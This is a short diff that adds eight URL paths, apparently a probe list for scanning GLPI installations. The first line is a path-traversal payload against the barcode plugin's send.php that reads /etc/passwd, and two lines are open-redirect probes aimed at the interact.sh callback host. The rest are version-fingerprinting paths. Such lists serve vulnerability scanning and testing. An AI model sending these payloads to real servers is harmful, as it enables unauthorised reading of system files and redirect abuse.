@@ -1,0 +1,8 @@
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
+
+/CHANGELOG.md
+/glpi/
+/index.php?redirect=/\/interact.sh/
+/index.php?redirect=//interact.sh
+/ajax/telemetry.php
+/glpi/ajax/telemetry.php
